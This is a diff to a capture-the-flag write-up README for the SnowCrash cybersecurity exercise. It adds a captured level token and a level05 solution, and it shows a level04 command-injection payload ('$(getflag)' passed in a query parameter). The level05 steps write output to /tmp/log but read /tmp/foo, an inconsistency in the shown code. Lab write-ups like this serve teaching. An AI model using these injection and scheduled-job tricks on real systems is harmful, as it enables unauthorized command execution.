@@ -14,6 +14,7 @@ This project will be an introduction to cyber security.
 | level03 | kooda2puivaav1idi4f57q8iq |
 | level04 | qi0maab88jeaj46qoumi7maus |
 | level05 | ne2searoevaevoem4ov4ar8ap |
+| level06 | viuaaale9huek52boumoomioc |
 
 ## Script
 
@@ -69,4 +70,12 @@ Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 ```bash
 level04@SnowCrash:~$ curl localhost:4747?x='$(getflag)'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+```
+
+### level05
+
+```bash
+echo "getflag > /tmp/log" > /opt/openarenaserver/foo
+sleep 120
+cat /tmp/foo
 ```
